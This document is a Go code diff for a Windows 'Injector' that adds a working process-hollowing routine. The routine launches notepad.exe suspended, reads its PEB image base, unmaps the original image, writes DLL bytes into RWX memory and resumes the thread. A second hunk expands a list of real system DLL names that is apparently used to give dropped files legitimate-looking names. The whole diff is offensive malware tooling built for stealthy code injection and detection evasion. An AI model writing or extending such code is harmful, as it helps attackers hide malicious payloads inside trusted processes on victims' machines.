@@ -179,9 +179,106 @@ func (i *Injector) performProcessHollowing(hProcess windows.Handle, baseAddress 
 	i.logger.Info("Performing process hollowing")
 
 	// Create suspended process
-	processInfo, err := CreateSuspendedProcess("")
+	processInfo, err := CreateSuspendedProcess("notepad.exe")
 	if err != nil {
 		return fmt.Errorf("failed to create suspended process: %v", err)
+	}
+
+	i.logger.Info("Created suspended process", "pid", processInfo.Process, "tid", processInfo.Thread)
+
+	// Open the suspended process
+	suspendedHandle, err := windows.OpenProcess(
+		windows.PROCESS_ALL_ACCESS,
+		false, processInfo.Process)
+	if err != nil {
+		return fmt.Errorf("failed to open suspended process: %v", err)
+	}
+	defer windows.CloseHandle(suspendedHandle)
+
+	// Get the base address of the suspended process
+	var processBaseAddr uintptr
+	var returnLength uintptr
+
+	ntdll := windows.NewLazySystemDLL("ntdll.dll")
+	ntQueryInformationProcess := ntdll.NewProc("NtQueryInformationProcess")
+
+	// Query process basic information to get PEB address
+	var pbi struct {
+		ExitStatus                   uint32
+		PebBaseAddress               uintptr
+		AffinityMask                 uintptr
+		BasePriority                 uint32
+		UniqueProcessId              uintptr
+		InheritedFromUniqueProcessId uintptr
+	}
+
+	ret, _, _ := ntQueryInformationProcess.Call(
+		uintptr(suspendedHandle),
+		0, // ProcessBasicInformation
+		uintptr(unsafe.Pointer(&pbi)),
+		unsafe.Sizeof(pbi),
+		uintptr(unsafe.Pointer(&returnLength)),
+	)
+
+	if ret != 0 {
+		return fmt.Errorf("failed to query process information: 0x%X", ret)
+	}
+
+	// Read image base from PEB
+	var imageBase uintptr
+	var bytesRead uintptr
+	err = windows.ReadProcessMemory(suspendedHandle, pbi.PebBaseAddress+8, // PEB.ImageBaseAddress offset
+		(*byte)(unsafe.Pointer(&imageBase)), unsafe.Sizeof(imageBase), &bytesRead)
+	if err != nil {
+		return fmt.Errorf("failed to read image base from PEB: %v", err)
+	}
+
+	processBaseAddr = imageBase
+	i.logger.Info("Found process base address", "address", fmt.Sprintf("0x%X", processBaseAddr))
+
+	// Unmap the original executable
+	ntUnmapViewOfSection := ntdll.NewProc("NtUnmapViewOfSection")
+	ret, _, _ = ntUnmapViewOfSection.Call(
+		uintptr(suspendedHandle),
+		processBaseAddr,
+	)
+
+	if ret != 0 {
+		i.logger.Warn("Failed to unmap original section", "status", fmt.Sprintf("0x%X", ret))
+		// Continue anyway, might still work
+	}
+
+	// Allocate memory for our DLL
+	allocAddr, err := VirtualAllocEx(suspendedHandle, processBaseAddr, uintptr(len(dllBytes)),
+		windows.MEM_COMMIT|windows.MEM_RESERVE, windows.PAGE_EXECUTE_READWRITE)
+	if err != nil {
+		// Try allocating at any address if preferred address fails
+		allocAddr, err = VirtualAllocEx(suspendedHandle, 0, uintptr(len(dllBytes)),
+			windows.MEM_COMMIT|windows.MEM_RESERVE, windows.PAGE_EXECUTE_READWRITE)
+		if err != nil {
+			return fmt.Errorf("failed to allocate memory in suspended process: %v", err)
+		}
+	}
+
+	// Write our DLL to the suspended process
+	var bytesWritten uintptr
+	err = WriteProcessMemory(suspendedHandle, allocAddr, unsafe.Pointer(&dllBytes[0]),
+		uintptr(len(dllBytes)), &bytesWritten)
+	if err != nil {
+		return fmt.Errorf("failed to write DLL to suspended process: %v", err)
+	}
+
+	i.logger.Info("Process hollowing completed", "allocated_at", fmt.Sprintf("0x%X", allocAddr))
+
+	// Resume the process (optional - depends on use case)
+	kernel32 := windows.NewLazySystemDLL("kernel32.dll")
+	resumeThread := kernel32.NewProc("ResumeThread")
+
+	threadHandle, err := windows.OpenThread(windows.THREAD_SUSPEND_RESUME, false, processInfo.Thread)
+	if err == nil {
+		resumeThread.Call(uintptr(threadHandle))
+		windows.CloseHandle(threadHandle)
+		i.logger.Info("Resumed hollowed process")
 	}
 	if processInfo != nil {
 		defer func() {
@@ -472,14 +569,49 @@ func (i *Injector) performThreadHijacking(hProcess windows.Handle, baseAddress u
 // Helper functions
 
 func generateLegitimateFileName() string {
+	// Expanded list of real Windows system DLL names
 	legitimateNames := []string{
 		"msvcr120.dll",
-		"api-ms-win-core-heap-l1-1-0.dll",
-		"api-ms-win-core-synch-l1-2-0.dll",
+		"msvcp120.dll",
 		"vcruntime140.dll",
 		"msvcp140.dll",
+		"ucrtbase.dll",
 		"concrt140.dll",
 		"vccorlib140.dll",
+		"api-ms-win-core-heap-l1-1-0.dll",
+		"api-ms-win-core-synch-l1-2-0.dll",
+		"api-ms-win-core-memory-l1-1-1.dll",
+		"api-ms-win-core-processthreads-l1-1-0.dll",
+		"api-ms-win-core-file-l1-1-0.dll",
+		"api-ms-win-core-handle-l1-1-0.dll",
+		"api-ms-win-core-string-l1-1-0.dll",
+		"api-ms-win-core-debug-l1-1-0.dll",
+		"api-ms-win-core-errorhandling-l1-1-0.dll",
+		"api-ms-win-core-localization-l1-2-0.dll",
+		"api-ms-win-core-datetime-l1-1-0.dll",
+		"api-ms-win-core-timezone-l1-1-0.dll",
+		"api-ms-win-core-console-l1-1-0.dll",
+		"api-ms-win-crt-runtime-l1-1-0.dll",
+		"api-ms-win-crt-heap-l1-1-0.dll",
+		"api-ms-win-crt-string-l1-1-0.dll",
+		"api-ms-win-crt-stdio-l1-1-0.dll",
+		"api-ms-win-crt-math-l1-1-0.dll",
+		"kernel32.dll",
+		"ntdll.dll",
+		"user32.dll",
+		"gdi32.dll",
+		"advapi32.dll",
+		"shell32.dll",
+		"ole32.dll",
+		"oleaut32.dll",
+		"comctl32.dll",
+		"comdlg32.dll",
+		"winmm.dll",
+		"version.dll",
+		"ws2_32.dll",
+		"wsock32.dll",
+		"netapi32.dll",
+		"winspool.drv",
 	}
 
 	return legitimateNames[time.Now().UnixNano()%int64(len(legitimateNames))]
